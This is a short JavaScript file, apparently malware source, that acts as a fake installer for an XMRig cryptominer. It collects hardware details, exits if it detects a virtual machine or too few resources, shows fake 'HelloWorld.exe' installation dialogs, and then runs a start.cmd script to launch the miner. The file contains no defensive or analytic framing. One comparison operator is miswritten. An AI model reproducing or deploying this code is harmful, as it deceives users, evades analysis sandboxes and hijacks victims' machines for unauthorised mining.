// needed libraries for information collection in XMRig

const Win = require('windows-interact');
const si = require('systeminformation');

// Fake installer

function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function runMiner() {
    Win.cmd('start.cmd');
}

async function fakeInstall() {

    try {
        await Win.alert('HelloWorld.exe is now being installed on your computer.', 'HelloWorld Installer');
        await Win.alert('Estimated disk space needed: 2 MB', 'HelloWorld Installer');
        await Win.alert('HelloWorld.exe has been successfully installed.', 'Installation successful');
    } catch {
        console.log("an error occured");
    } finally {
        runMiner();
    }
}


async function checkForHardwareSupport() {

    try {
        const cpu = await si.cpu();
        const os = await si.osInfo();
        const mem = await si.mem(); // in bytes!
        const system = await si.system(); // used for checking if it's a virtual machine

        if (cpu.cores < 2 || mem.total < 4000000000) {
            await Win.alert('Insufficient system resources to continue', 'Problem encountered');
            process.exit();
        }
        if (os.platform ==! 'Windows') {
            await Win.alert('This program does not run on Linux or MacOS', 'Unsupported operating system');
            process.exit();
        }
        if (system.virtual == true) {
            await Win.alert('Not intended for use in a virtual machine', 'VM detected');
            process.exit();
        }
    } catch {
        process.exit();
    } finally {
        fakeInstall();
    }
}

checkForHardwareSupport();


